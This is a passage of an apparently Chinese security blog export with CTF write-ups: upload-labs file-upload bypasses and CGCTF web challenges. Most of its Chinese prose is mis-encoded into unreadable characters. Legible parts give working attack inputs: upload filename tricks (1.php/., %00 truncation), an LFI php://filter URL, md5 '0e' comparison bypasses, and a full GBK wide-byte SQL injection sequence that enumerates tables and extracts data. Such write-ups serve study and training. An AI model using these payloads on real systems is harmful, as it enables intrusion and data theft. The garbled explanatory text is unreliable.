å…¥çš„ï¼Œç„¶åé€šè¿‡é»‘åå•è¿‡æ»¤æ–‡ä»¶åç¼€åï¼Œæœ€åç›´æ¥ç”¨æ–‡ä»¶åæ‹¼æ¥ä¿å­˜çš„æ–‡ä»¶è·¯å¾„ä¸Šä¼ ä¸Šå»ã€‚è¿™å…³çš„ç»•è¿‡æ–¹æ³•å°±å¾ˆå¤šäº†ï¼š 0x00æˆªæ–­ ç‚¹ç»•è¿‡ ::$DATAç»•è¿‡ ç©ºæ ¼ç»•è¿‡ å¤§å°å†™ç»•è¿‡ Apacheè§£ææ¼æ´ç»•è¿‡ è¿™äº›éƒ½æ˜¯ä¹‹å‰å…³å¡éƒ½ç”¨è¿‡çš„ç»•è¿‡æ–¹å¼ï¼Œè¿™é‡Œæ˜æ˜¾æ˜¯è€ƒå¯Ÿåˆ«çš„çŸ¥è¯†ç‚¹ã€‚äºæ˜¯ç½‘ä¸Šæ‰¾æ‰¾åˆ«äººçš„ç­”æ¡ˆï¼Œå‘ç°è€ƒç‚¹æ˜¯:move_uploaded_fileä¼šå¿½ç•¥æ‰æ–‡ä»¶æœ«å°¾çš„/.ï¼Œæ‰€ä»¥å¯ä»¥æ„é€ save_path=1.php/.ï¼Œè¿™æ ·file_extå€¼å°±ä¸ºç©ºï¼Œå°±èƒ½ç»•è¿‡é»‘åå•ï¼Œè€Œmove_uploaded_fileå‡½æ•°å¿½ç•¥æ–‡ä»¶æœ«å°¾çš„/.å¯ä»¥å®ç°ä¿å­˜æ–‡ä»¶ä¸º.phpã€‚ ç»•è¿‡æ–‡ä»¶ååç¼€ï¼š post: save_name = 1.php%00.jpg post: save_name = 1.php/.ã€ Pass-20 æ•°ç»„+\\.ç»•è¿‡ ä»£ç  12345678910111213141516171819202122232425262728293031323334$is_upload = false;$msg = null;if(!empty($_FILES[&#x27;upload_file&#x27;]))&#123; //æ£€æŸ¥MIME $allow_type = array(&#x27;image/jpeg&#x27;,&#x27;image/png&#x27;,&#x27;image/gif&#x27;); if(!in_array($_FILES[&#x27;upload_file&#x27;][&#x27;type&#x27;],$allow_type))&#123; $msg = &quot;ç¦æ­¢ä¸Šä¼ è¯¥ç±»å‹æ–‡ä»¶!&quot;; &#125;else&#123; //æ£€æŸ¥æ–‡ä»¶å $file = empty($_POST[&#x27;save_name&#x27;]) ? $_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;] : $_POST[&#x27;save_name&#x27;]; if (!is_array($file)) &#123; $file = explode(&#x27;.&#x27;, strtolower($file)); &#125; $ext = end($file); $allow_suffix = array(&#x27;jpg&#x27;,&#x27;png&#x27;,&#x27;gif&#x27;); if (!in_array($ext, $allow_suffix)) &#123; $msg = &quot;ç¦æ­¢ä¸Šä¼ è¯¥åç¼€æ–‡ä»¶!&quot;; &#125;else&#123; $file_name = reset($file) . &#x27;.&#x27; . $file[count($file) - 1]; $temp_file = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;]; $img_path = UPLOAD_PATH . &#x27;/&#x27; .$file_name; if (move_uploaded_file($temp_file, $img_path)) &#123; $msg = &quot;æ–‡ä»¶ä¸Šä¼ æˆåŠŸï¼&quot;; $is_upload = true; &#125; else &#123; $msg = &quot;æ–‡ä»¶ä¸Šä¼ å¤±è´¥ï¼&quot;; &#125; &#125; &#125;&#125;else&#123; $msg = &quot;è¯·é€‰æ‹©è¦ä¸Šä¼ çš„æ–‡ä»¶ï¼&quot;;&#125; reset()å‡½æ•°ï¼šå°†å†…éƒ¨æŒ‡é’ˆæŒ‡å‘æ•°ç»„ä¸­çš„ç¬¬ä¸€ä¸ªå…ƒç´ ï¼Œå¹¶è¾“å‡ºã€‚ end()å‡½æ•°ï¼šå°†æ•°ç»„å†…éƒ¨æŒ‡é’ˆæŒ‡å‘æœ€åä¸€ä¸ªå…ƒç´ ï¼Œå¹¶è¿”å›è¯¥å…ƒç´ çš„å€¼ï¼ˆå¦‚æœæˆåŠŸï¼‰ã€‚ explode()å‡½æ•°ï¼šæŠŠå­—ç¬¦ä¸²æ‰“æ•£ä¸ºæ•°ç»„ã€‚ ç»•è¿‡æ–¹å¼ å…ˆç†æ¸…ä¸€ä¸‹å‡½æ•°åšäº†ä»€ä¹ˆæ“ä½œï¼š å‡½æ•°æ‰§è¡Œæµç¨‹ï¼šæ–‡ä»¶åé€šè¿‡POSTæ–¹å¼æäº¤â€”&gt;MIMEç™½åå•æ ¡éªŒâ€”&gt;æ–‡ä»¶åç¼€ç™½åå•æ ¡éªŒâ€”&gt;è·å–æ–‡ä»¶åæ‹¼æ¥åˆ°ä¸Šä¼ çš„è·¯å¾„ã€‚å…·ä½“è€Œè¨€ï¼š ä»¥POSTæ–¹å¼ä¸Šä¼ save_nameæ—¶ï¼Œç¨‹åºä¼šå°†è¯¥å‚æ•°ä½œä¸ºæ–‡ä»¶åï¼›æ¥ç€åˆ¤æ–­è¯¥æ–‡ä»¶åå‚æ•°save_nameæ˜¯å¦ä¸ºæ•°ç»„ï¼Œè‹¥ä¸æ˜¯åˆ™ç›´æ¥.æ¥åˆ‡åˆ†ä¸ºæ•°ç»„å½¢å¼ï¼›extå˜é‡æ˜¯è°ƒç”¨end()å‡½æ•°å–æ•°ç»„æœ€åçš„ä¸€ä¸ªå…ƒç´ çš„å€¼ï¼Œè‹¥æ–‡ä»¶åå‚æ•°save_nameä¸æ˜¯æ•°ç»„å½“ç„¶æ˜¯æ­£å¸¸çš„åç¼€åï¼Œä½†æ˜¯è‹¥æ–‡ä»¶åå‚æ•°save_nameæ˜¯æ•°ç»„åˆ™å–çš„å°±æ˜¯save_nameä¸­æœ€åä¸€ä¸ªå…ƒç´ å€¼ï¼›extå’Œç™½åå•åˆ¤æ–­è¿‡æ»¤åï¼Œé€šè¿‡reset()å‡½æ•°è·å–æ–‡ä»¶åï¼Œè‹¥æ–‡ä»¶åå‚æ•°save_nameä¸ä¸ºæ•°ç»„ã€æ­¤æ—¶å½“ç„¶å°±æ˜¯æ­£å¸¸çš„æ–‡ä»¶åï¼Œä½†è‹¥æ–‡ä»¶åå‚æ•°save_nameä¸ºæ•°ç»„ï¼Œåˆ™æ˜¯å–save_nameä¸­ç¬¬ä¸€ä¸ªå…ƒç´ å€¼ï¼›è€Œæœ€åä¸Šä¼ æ–‡ä»¶çš„åç¼€åæ˜¯ç›´æ¥æ‹¼æ¥è¯¥è¯­å¥çš„å€¼$file[count($file) - 1]å³å°†æœ€åä¸€ä¸ªå…ƒç´ å€¼ä½œä¸ºåç¼€åã€‚ åˆ†æåˆ°è¿™é‡Œï¼Œç»•è¿‡çš„å…³é”®æ€è·¯å°±æ˜¯ï¼šend($file)æ˜¯jpgã€pngã€gifï¼Œè€Œ$fileæœ€åä¸€ä¸ªå…ƒç´ æ˜¯phpã€‚ è¿™é‡Œå¯ä»¥æ„é€ save_name[0] = 1.php/,save_name[2] = jpgï¼Œè¿™æ ·çš„è¯end($file)ä¸ºjpgï¼Œè€Œ$file[count($file) - 1]ä¸º$file[1]ä¸ºç©ºã€‚æ‰€ä»¥æœ€ç»ˆfile_name=1.php/.ï¼Œåˆ°è¿™é‡Œå°±è·ŸPass-19ä¸€æ ·äº†ã€‚ æ–‡ä»¶ä¸Šä¼ æ¼æ´æ€»ç»“ æ¼æ´ç±»å‹åˆ†ç±» æ¼æ´ç±»å‹åˆ¤æ–­æ–¹å¼ Reference é¡¹ç›®åœ°å€ï¼š https://github.com/c0ny1/upload-labs Upload-labs WriteUp","tags":[{"name":"webå®‰å…¨åŸºç¡€","slug":"webå®‰å…¨åŸºç¡€","permalink":"http://ca0y1h.top/tags/web%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80/"},{"name":"æ–‡ä»¶ä¸Šä¼ ","slug":"æ–‡ä»¶ä¸Šä¼ ","permalink":"http://ca0y1h.top/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"}],"categories":[{"name":"webå®‰å…¨","slug":"webå®‰å…¨","permalink":"http://ca0y1h.top/categories/web%E5%AE%89%E5%85%A8/"},{"name":"åŸºç¡€å­¦ä¹ ","slug":"webå®‰å…¨/åŸºç¡€å­¦ä¹ ","permalink":"http://ca0y1h.top/categories/web%E5%AE%89%E5%85%A8/%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0/"}]},{"title":"CTF-Writeupä¹‹CGCTF","date":"2019-11-19T12:54:32.000Z","path":"Web_security/ctf_writeup/3.CGCTF-Writeup/","text":"CGCTF Writeup Web å·²ç»å†³å®šå¼€å§‹èµ°ä¸Šäº†CTFçš„ä¸å½’è·¯äº†ï¼Œè¿™æ˜¯ç¬¬ä¸€ä¸ªç»ƒæ‰‹çš„CTFï¼Œæ¯”è¾ƒé€‚åˆæ–°æ‰‹å…¥é—¨å­¦ä¹ ï¼Œæœ‰å‡ é“é¢˜ä¹Ÿæ˜¯çœ‹çš„ç½‘ä¸Šçš„Writeupï¼Œæ€»çš„æ¥è¯´ä¸æ˜¯å¾ˆéš¾å§ï¼Œé‡åœ¨æ€»ç»“ç»éªŒå’Œç»•è¿‡å§¿åŠ¿ã€‚ ä¼ é€é—¨ Web ç­¾åˆ°é¢˜ é¢˜å¹² è¿™ä¸€å®šæ˜¯æœ€ç®€å•çš„ é¢˜è§£ ç›´æ¥F12æŸ¥çœ‹æºä»£ç ï¼š **flagï¼šnctf&#123;flag_admiaanaaaaaaaaaaa&#125; ** md5 collision é¢˜å¹² æºç ï¼ˆPHPï¼‰ 12345678910$md51 = md5(&#x27;QNKCDZO&#x27;);$a = @$_GET[&#x27;a&#x27;];$md52 = @md5($a);if(isset($a))&#123;if ($a != &#x27;QNKCDZO&#x27; &amp;&amp; $md51 == $md52) &#123; echo &quot;nctf&#123;*****************&#125;&quot;;&#125; else &#123; echo &quot;false!!!&quot;;&#125;&#125;else&#123;echo &quot;please input a&quot;;&#125; é¢˜è§£ çœ‹æºç çš„æ„æ€å°±æ˜¯ï¼Œè®©æˆ‘ä»¬è¾“å…¥ä¸€ä¸ªidï¼Œè¿™ä¸ªidçš„å€¼ä¸ç­‰äºQNKCDZOï¼Œä½†æ˜¯ä»–ä»¬çš„md5ç æ˜¯ç›¸åŒçš„ã€‚ ===æ¯”è¾ƒä¸¤ä¸ªå˜é‡çš„å€¼å’Œç±»å‹ï¼› ==æ¯”è¾ƒä¸¤ä¸ªå˜é‡çš„å€¼,ä¸æ¯”è¾ƒæ•°æ®ç±»å‹ã€‚ é¦–å…ˆçœ‹ä¸€ä¸‹QNKCDZOçš„md5ç æ˜¯ä»€ä¹ˆï¼š0e830400451993494058024219903391ã€‚ md5ç¢°æ’åŸç†ï¼šä¸€ä¸ªæ•°å­—å’Œä¸€ä¸ªå­—ç¬¦ä¸²è¿›è¡Œæ¯”è¾ƒï¼ŒPHPä¼šæŠŠå­—ç¬¦ä¸²è½¬æ¢æˆæ•°å­—å†è¿›è¡Œæ¯”è¾ƒã€‚PHPè½¬æ¢çš„è§„åˆ™çš„æ˜¯ï¼šè‹¥å­—ç¬¦ä¸²ä»¥æ•°å­—å¼€å¤´ï¼Œåˆ™å–å¼€å¤´æ•°å­—ä½œä¸ºè½¬æ¢ç»“æœï¼Œè‹¥æ— åˆ™è¾“å‡º0ã€‚ä¾‹å¦‚ï¼š123abcè½¬æ¢ååº”è¯¥æ˜¯123ï¼Œè€Œabcåˆ™ä¸º0ï¼Œ0==0è¿™å½“ç„¶æ˜¯æˆç«‹çš„ã€‚æ‰€ä»¥ï¼Œ0 ==â€™abcâ€™æ˜¯æˆç«‹çš„ã€‚å½“æœ‰ä¸€ä¸ªå¯¹æ¯”å‚æ•°æ˜¯æ•´æ•°çš„æ—¶å€™ï¼Œä¼šæŠŠå¦å¤–ä¸€ä¸ªå‚æ•°å¼ºåˆ¶è½¬æ¢ä¸ºæ•´æ•°ã€‚ æ‰€ä»¥ï¼Œæˆ‘ä»¬åªè¦æ‰¾åˆ°md5åŠ å¯†åä»¥0eå¼€å¤´çš„å­—ç¬¦ä¸²å°±å¯ä»¥ç»•è¿‡==çš„åˆ¤æ–­äº†ï¼Œè¿™é‡Œç»™å¤§å®¶åˆ—ä¸¾äº†ä¸€å†™ï¼šå¸¸è§çš„MD5ç¢°æ’ï¼šmd5å€¼ä¸º0eå¼€å¤´ ä¸ä¹‹ç±»ä¼¼çš„è¿˜æœ‰sha1ï¼š aaroZmOk aaK1STfY aaO8zKZF aaO8zKZF aa3OFF9mï¼Œè¿™å‡ ä¸ªå­—ç¬¦ä¸²ç»è¿‡sha1åŠ å¯†åä¹Ÿæ˜¯0eå¼€å¤´ã€‚ **flagï¼šnctf&#123;md5_collision_is_easy&#125; ** ç­¾åˆ°2 æç¤ºè¾“å…¥å£ä»¤ã€‚ å…ˆæŠŠè¾“å…¥æ¡†çš„ç±»å‹æ”¹ä¸ºtextï¼Œå¯ä»¥å‘ç°åªèƒ½è¾“å…¥10ä¸ªå­—ç¬¦ï¼Œå³è¾“å…¥æ¡†å¯¹è¾“å…¥é•¿åº¦è¿›è¡Œäº†é™åˆ¶ã€‚ ä¿®æ”¹ä¸€ä¸‹æœ€å¤§é•¿åº¦ï¼Œè¾“å…¥zhimakaimenå³å¯ã€‚ flagï¼šnctf&#123;follow_me_to_exploit&#125; è¿™é¢˜ä¸æ˜¯Web ç½‘é¡µä¸­ç»™äº†ä¸€å¼ å›¾ç‰‡ï¼Œå¹¶ä¸”æç¤ºè¿™é“é¢˜ä¸æ˜¯Webï¼Œå¯ä»¥è”æƒ³åˆ°å¯èƒ½æ˜¯å›¾ç‰‡éšå†™æœ¯ã€‚ç›´æ¥Downloadå›¾ç‰‡ï¼Œç”¨Notepad++æ‰“å¼€ã€‚ flagï¼šnctf&#123;photo can also hid3 msg&#125; å±‚å±‚é€’è¿› ä½¿ç”¨F12æŸ¥çœ‹æºä»£ç ï¼Œæ ¹æ®é¢˜ç›®æç¤ºâ€œå±‚å±‚é€’è¿›â€ï¼Œè¿™é“é¢˜ä½¿ç”¨iframeæ ‡ç­¾å¯¹é¡µé¢è¿›è¡ŒåµŒå¥—ï¼Œæ‰¾åˆ°æœ€åä¸€ä¸ª404.htmlé¡µé¢ï¼Œç«Ÿç„¶æç¤ºæˆ‘æŸ¥çœ‹ä¸Šä¸€ä¸ªé¡µé¢ã€‚åŸè°…æˆ‘çœ¼çï¼Œæ‰¾äº†å¥½ä¹…ï¼Œå‘ç°éšè—åœ¨æ³¨é‡Šé‡Œé¢ã€‚ flagï¼šnctf&#123;this_is_a_fl4g&#125; AAencode é¢˜å¹² javascript aaencode é¢˜è§£ ä¸Šç½‘æœä¸€ä¸‹javascript aaencodeï¼Œå‘ç°æ˜¯ä¸€ç§é¢œæ–‡å­—ï¼š JJencodeï¼šå°†JSä»£ç è½¬æ¢æˆåªæœ‰ç¬¦å·çš„å­—ç¬¦ä¸² AAencodeï¼šå°†JSä»£ç è½¬æ¢æˆå¸¸ç”¨çš„ç½‘ç»œç¬¦å· AAencodeåŠ å¯†ç½‘å€ï¼š http://utf-8.jp/public/aaencode.html è§£å¯†æ–¹æ³•ï¼šä»¥ç›´æ¥åˆ©ç”¨æµè§ˆå™¨çš„æ§åˆ¶å°è¾“å…¥å¯†æ–‡ï¼Œæ‰§è¡Œåå³å¯è§£å¯†ã€‚ å•èº«äºŒåå¹´ é¢˜å¹² è¿™é¢˜å¯ä»¥é æŠ€æœ¯ä¹Ÿå¯ä»¥é æ‰‹é€Ÿï¼ è€å¤«å•èº«äºŒåå¹´ï¼Œè‡ªç„¶é çš„æ˜¯æ‰‹é€Ÿï¼ é¢˜è§£ çœ‹åˆ°ä¸€ä¸ªé“¾æ¥ï¼ŒæŸ¥çœ‹æºä»£ç ï¼Œè¯¥é“¾æ¥æŒ‡å‘./search_key.php ç‚¹å‡»é“¾æ¥ï¼Œæˆ‘ä»¬å´å»åˆ°äº†./no_key_is_here_forever.phpè¿™ä¸ªé¡µé¢ çŒœæµ‹æ˜¯302è·³è½¬ã€‚ ä½¿ç”¨Burp SuiteæŠ“åŒ…ï¼ŒæŸ¥çœ‹Sitemapï¼š **flagï¼šnctf&#123;yougotit_script_now&#125; ** PHP decode é¢˜å¹² è§åˆ°çš„ä¸€ä¸ªç±»ä¼¼ç¼–ç çš„shellï¼Œè¯·è§£ç  12345678910111213141516&lt;?phpfunction CLsI($ZzvSWE) &#123; $ZzvSWE = (base64_decode($ZzvSWE)); for ($i = 0; $i &lt; strlen($ZzvSWE); $i++) &#123; $ZzvSWE[$i] = chr(ord($ZzvSWE[$i]) - 1); &#125; return $ZzvSWE; &#125;eval(CLsI(&quot;+7DnQGFmYVZ+eoGmlg0fd3puUoZ1fkppek1GdVZhQnJSSZq5aUImGNQBAA==&quot;));?&gt; é¢˜è§£ è¿™é“é¢˜ç›´æ¥æ‹¿åˆ°æœ¬åœ°è¿è¡Œè¿™æ®µä»£ç flagä¸å°±å‡ºæ¥äº†-_- flag:nctf{gzip_base64_hhhhhh} æ–‡ä»¶åŒ…å« é¢˜å¹² æ²¡é”™ è¿™å°±æ˜¯ä¼ è¯´ä¸­çš„LFI é¢˜è§£ æœ‰å…³æ–‡ä»¶åŒ…å«æ¼æ´çš„åˆ©ç”¨æˆ‘åœ¨å¦å¤–ä¸€ç¯‡åšæ–‡å¾ˆè¯¦ç»†çš„ä»‹ç»äº†ï¼Œå¯ä»¥ç§»æ­¥äºæ­¤ã€‚ æŸ¥çœ‹index.phpé¡µé¢çš„æºä»£ç ï¼š 1http:&#x2F;&#x2F;4.chinalover.sinaapp.com&#x2F;web7&#x2F;index.php?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;index.php æŠŠç»“æœç»è¿‡base64è§£ç åå¾—åˆ°æºä»£ç ï¼š 12345678910111213141516&lt;html&gt; &lt;title&gt;asdf&lt;/title&gt; &lt;?php error_reporting(0); if(!$_GET[file])&#123;echo &#x27;&lt;a href=&quot;./index.php?file=show.php&quot;&gt;click me? no&lt;/a&gt;&#x27;;&#125; $file=$_GET[&#x27;file&#x27;]; if(strstr($file,&quot;../&quot;)||stristr($file, &quot;tp&quot;)||stristr($file,&quot;input&quot;)||stristr($file,&quot;data&quot;))&#123; echo &quot;Oh no!&quot;; exit(); &#125; include($file); //flag:nctf&#123;edulcni_elif_lacol_si_siht&#125;?&gt;&lt;/html&gt; å°±å¯ä»¥ç›´æ¥åˆ°flag:nctf&#123;edulcni_elif_lacol_si_siht&#125; å•èº«ä¸€ç™¾å¹´ä¹Ÿæ²¡ç”¨ ä¸ç¬¬7é¢˜ç±»ä¼¼ flag: nctf&#123;this_is_302_redirect&#125; Cookie é¢˜å¹² COOKIEå°±æ˜¯ç”œé¥¼çš„æ„æ€~ TIP: 0==not é¢˜è§£ F12æŸ¥çœ‹requestæ•°æ®åŒ…ä¸­çš„cookieå­—æ®µï¼Œå‘ç°Login=0ã€‚ ç”¨BurpSuitæŠ“åŒ…ä¿®æ”¹cookieå‚æ•°Login=1å³å¯ã€‚ flag:nctf&#123;cookie_is_different_from_session&#125; MySQL é¢˜å¹² ä¸èƒ½æ¯ä¸€é¢˜éƒ½è¿™ä¹ˆç®€å•å˜› ä½ è¯´æ˜¯ä¸æ˜¯ï¼Ÿ é¡µé¢æç¤ºDo you know robots.txtï¼Ÿ äºæ˜¯è®¿é—®http://chinalover.sinaapp.com/web11/robots.txt è¿”å›ï¼š 12345678910111213141516171819åˆ«å¤ªå¼€å¿ƒï¼Œflagä¸åœ¨è¿™ï¼Œè¿™ä¸ªæ–‡ä»¶çš„ç”¨é€”ä½ çœ‹å®Œäº†ï¼Ÿåœ¨CTFæ¯”èµ›ä¸­ï¼Œè¿™ä¸ªæ–‡ä»¶å¾€å¾€å­˜æ”¾ç€æç¤ºä¿¡æ¯TIP:sql.php&lt;?phpif($_GET[id]) &#123; mysql_connect(SAE_MYSQL_HOST_M . &#39;:&#39; . SAE_MYSQL_PORT,SAE_MYSQL_USER,SAE_MYSQL_PASS); mysql_select_db(SAE_MYSQL_DB); $id &#x3D; intval($_GET[id]); $query &#x3D; @mysql_fetch_array(mysql_query(&quot;select content from ctf2 where id&#x3D;&#39;$id&#39;&quot;)); if ($_GET[id]&#x3D;&#x3D;1024) &#123; echo &quot;&lt;p&gt;no! try again&lt;&#x2F;p&gt;&quot;; &#125; else&#123; echo($query[content]); &#125;&#125;?&gt; åº”è¯¥æ˜¯è®©æˆ‘ä»¬è¾“å…¥ä¸€ä¸ªidï¼Œä½†ä»–çš„å€¼ä¸ç­‰äº1024ï¼Œä½†æ˜¯intvalä¹‹åå’Œ1024ç›¸ç­‰ï¼Œé‚£ä¹ˆåªè¦çŸ¥é“intval()å‡½æ•°å–æ•´ï¼Œå°±å¾ˆå®¹æ˜“äº†ã€‚ payload 1http:&#x2F;&#x2F;chinalover.sinaapp.com&#x2F;web11&#x2F;sql.php?id&#x3D;1024.1 å¾—åˆ°flag:nctf&#123;query_in_mysql&#125; æˆ‘æœ€å…ˆå¼€å§‹æ²¡æœ‰æ³¨æ„åˆ°è¿˜æœ‰ä¸€ä¸ªæç¤ºï¼šTIP:sql.phpï¼Œå¯¼è‡´æˆ‘åœ¨å…¶ä»–è·¯å¾„æµªè´¹äº†å¾ˆå¤šæ—¶é—´ã€‚ GBK Injection æ ¹æ®é¢˜ç›®å¾ˆå®¹æ˜“å°±èƒ½æƒ³åˆ°è¿™æ˜¯è€ƒå¯Ÿå®½å­—èŠ‚æ³¨å…¥ï¼Œå…ˆæ¥ç¨å¾®çš„ä»‹ç»ä¸€ä¸‹ä»€ä¹ˆæ˜¯å®½å­—èŠ‚æ³¨å…¥ã€‚ å®½å­—èŠ‚æ³¨å…¥ä¸»è¦æ˜¯æºäºç¨‹åºå‘˜è®¾ç½®æ•°æ®åº“ç¼–ç ä¸PHPç¼–ç è®¾ç½®ä¸ºä¸åŒçš„ä¸¤ä¸ªç¼–ç é‚£ä¹ˆå°±æœ‰å¯èƒ½äº§ç”Ÿå®½å­—èŠ‚æ³¨å…¥ã€‚ä¾‹å¦‚è¯´PHPçš„ç¼–ç ä¸º UTF-8è€ŒMySqlçš„ç¼–ç è®¾ç½®ä¸ºäº† SET NAMES 'gbk'æˆ–æ˜¯ SET character_set_client =gbkï¼Œè¿™æ ·é…ç½®ä¼šå¼•å‘ç¼–ç è½¬æ¢ä»è€Œå¯¼è‡´çš„æ³¨å…¥æ¼æ´ã€‚å…·ä½“æ¥è¯´ï¼Œå‡å¦‚æŸä¸ªç½‘ç«™æœ‰å®½å­—èŠ‚æ³¨å…¥ï¼Œé‚£ä¹ˆæˆ‘ä»¬æäº¤ï¼š 1http:&#x2F;&#x2F;127.0.0.1&#x2F;unicodeSqlTest?id&#x3D;%df%27 è¿™æ—¶,å‡å¦‚æˆ‘ä»¬ç°åœ¨ä½¿ç”¨çš„æ˜¯addslashesæ¥è¿‡æ»¤,é‚£ä¹ˆå°±ä¼šå‘ç”Ÿå¦‚ä¸‹çš„è½¬æ¢è¿‡ç¨‹ï¼š 1%df%27&#x3D;&#x3D;&#x3D;(addslashes)&#x3D;&#x3D;&#x3D;&gt;%df%5c%27&#x3D;&#x3D;&#x3D;(æ•°æ®åº“GBK)&#x3D;&#x3D;&#x3D;&gt;é‹&#39; å‰ç«¯è¾“å…¥%df%27æ—¶é¦–å…ˆç»è¿‡ä¸Šé¢addslasheså‡½æ•°è½¬ä¹‰å˜æˆäº†%df%5c%27ï¼ˆ%5cæ˜¯åæ–œæ \\)ï¼Œä¹‹ååœ¨æ•°æ®åº“æŸ¥è¯¢å‰å› ä¸ºè®¾ç½®äº†GBKç¼–ç ï¼Œå³æ˜¯åœ¨æ±‰å­—ç¼–ç èŒƒå›´å†…ä¸¤ä¸ªå­—èŠ‚éƒ½ä¼šç»™é‡æ–°ç¼–ç ä¸ºä¸€ä¸ªæ±‰å­—ã€‚ç„¶åMySQLæœåŠ¡å™¨å°±ä¼šå¯¹æŸ¥è¯¢è¯­å¥è¿›è¡ŒGBKç¼–ç å³æ˜¯%df%5cè½¬æ¢æˆäº†æ±‰å­—é‹ï¼Œè€Œå•å¼•å·å°±é€ƒé€¸äº†å‡ºæ¥ï¼Œä»è€Œé€ æˆäº†æ³¨å…¥æ¼æ´ã€‚ ä»‹ç»å®Œäº†å®½å­—èŠ‚æ³¨å…¥çš„åŸç†ï¼Œæˆ‘ä»¬å†å›åˆ°è¿™é“é¢˜ç›®ã€‚ é¦–å…ˆæˆ‘ä»¬ä½¿ç”¨å®½å­—èŠ‚æ³¨å…¥æ¥è¿›è¡Œç»•è¿‡ï¼Œå½“æˆ‘ä»¬è¾“å…¥%df'ï¼Œå‡ºç°å¦‚ä¸‹æŠ¥é”™ï¼š 1234your sql:select id,title from news where id &#x3D; &#39;1é‹&#39;&#39;Warning: mysql_fetch_array() expects parameter 1 to be resource, boolean given in SQL-GBK&#x2F;index.php on line 10 å‘ç°å‡ºç°äº†æŠ¥é”™ï¼Œè¯´æ˜æˆ‘ä»¬çš„è¯­å¥å·²ç»å½±å“äº†æ­£å¸¸è¯­å¥çš„æ‰§è¡Œäº†ï¼Œå¯ä»¥å¼€å§‹æ³¨å…¥äº†ã€‚ é¦–å…ˆä½¿ç”¨order byåˆ¤æ–­åˆ—æ•°ï¼š 12http:&#x2F;&#x2F;chinalover.sinaapp.com&#x2F;SQL-GBK&#x2F;index.php?id&#x3D;1%df%27%20order%20by%202--+ å‘ç°åªæœ‰ä¸¤åˆ—ï¼Œå†æŸ¥è¯¢å½“å‰æ•°æ®åº“åï¼š 12http:&#x2F;&#x2F;chinalover.sinaapp.com&#x2F;SQL-GBK&#x2F;index.php?id&#x3D;-1%df&#39; union select 1,database()--+ å¾—åˆ°sae-chinaloverï¼Œæ¥ç€æŸ¥è¯¢è¯¥æ•°æ®åº“ä¸­çš„è¡¨åï¼š 12http:&#x2F;&#x2F;chinalover.sinaapp.com&#x2F;SQL-GBK&#x2F;index.php?id&#x3D;-1%df&#39; union select 1,group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()--+ å¾—åˆ°ctf,ctf2,ctf3,ctf4,gbksqli,newsï¼Œå†æŸ¥è¯¢åˆ—åï¼š 12http:&#x2F;&#x2F;chinalover.sinaapp.com&#x2F;SQL-GBK&#x2F;index.php?id&#x3D;-1%df&#39; union select 1,group_concat(column_name) from information_schema.columns where table_name&#x3D;0x63746634--+ è¿™é‡Œéœ€è¦æŠŠctf4è½¬æ¢ä¸ºåå…­è¿›åˆ¶ å¾—åˆ°id, flagï¼Œæœ€åæŸ¥è¯¢æ•°æ®ï¼š 12http:&#x2F;&#x2F;chinalover.sinaapp.com&#x2F;SQL-GBK&#x2F;index.php?id&#x3D;-1%df&#39; union select 1,flag from ctf4--+ å¾—åˆ°flag: nctf&#123;gbk_3sqli&#125; /x00 é¢˜å¹² é¢˜ç›®æœ‰å¤šç§è§£æ³•ï¼Œä½ èƒ½æƒ³å‡ºæ¥å‡ ç§ï¼Ÿ é¢˜è§£ 123456789if (isset ($_GET[&#x27;nctf&#x27;])) &#123; if (@ereg (&quot;^[1-9]+$&quot;, $_GET[&#x27;nctf&#x27;]) === FALSE) echo &#x27;å¿…é¡»è¾“å…¥æ•°å­—æ‰è¡Œ&#x27;; else if (strpos ($_GET[&#x27;nctf&#x27;], &#x27;#biubiubiu&#x27;) !== FALSE) die(&#x27;Flag: &#x27;.$flag); else echo &#x27;éªšå¹´ï¼Œç»§ç»­åŠªåŠ›å§å•Š~&#x27;; &#125; æ ¹æ®ä¸Šé¢çš„æºç æç¤ºï¼Œè¦è¾“å…¥æ•°å­—å¹¶ä¸”å«æœ‰#biubiubiuå­—ç¬¦ä¸²çš„nctfå‚æ•°ã€‚ ç¬¬ä¸€ç§è§£æ³•ï¼š ä½¿ç”¨00æˆªæ–­ç»•è¿‡eregå‡½æ•°ï¼Œä½†è¦æ³¨æ„å°†#urlç¼–ç ã€‚ 12http:&#x2F;&#x2F;teamxlc.sinaapp.com&#x2F;web4&#x2F;f5a14f5e6e3453b78cd73899bad98d53&#x2F;index.php?nctf&#x3D;1%00%23biubiubiu ç¬¬äºŒç§è§£æ³•ï¼š ç¬¬ä¸€ä¸ªä¸ç­‰å¼ä¸­eregå‡½æ•°ï¼Œå½“ä¼ å…¥å‚æ•°ä¸ºæ•°ç»„nctf[]æ—¶ï¼ŒNULL != FALSE ï¼Œæ„é€ æˆåŠŸè·³è¿‡ç¬¬ä¸€ä¸ªä¸ç­‰å¼ï¼Œç¬¬äºŒä¸ªä¸ç­‰å¼ä¸­strposå‡½æ•°ä¼ å…¥å‚æ•°æ•°ç»„ä¹‹å NULL != FLASEä¼šè¿”å›flagã€‚ **flag:nctf&#123;use_00_to_jieduan&#125; ** Bypass again é¢˜å¹² ä¾æ—§æ˜¯å¼±ç±»å‹ æ¥æº hctf é¢˜è§£ 12345678if (isset($_GET[&#x27;a&#x27;]) and isset($_GET[&#x27;b&#x27;])) &#123;if ($_GET[&#x27;a&#x27;] != $_GET[&#x27;b&#x27;])if (md5($_GET[&#x27;a&#x27;]) == md5($_GET[&#x27;b&#x27;]))die(&#x27;Flag: &#x27;.$flag);elseprint &#x27;Wrong.&#x27;;&#125; ä¸ç¬¬äºŒé“é¢˜md5 collisionç±»ä¼¼,ï¼Œåªéœ€è¦æ‰¾åˆ°ä¸¤ä¸ªå­—ç¬¦ä¸²ç»è¿‡md5åŠ å¯†åï¼Œå‡ä»¥0eå¼€å¤´å³å¯ç»•è¿‡éªŒè¯ã€‚ Payloadï¼š?a=QNKCDZO&amp;b=240610708 Flag: nctf&#123;php_is_so_cool&#125; å˜é‡è¦†ç›– é¢˜å¹² å¬è¯´è¿‡å˜é‡è¦†ç›–ä¹ˆï¼Ÿ é¢˜è§£ 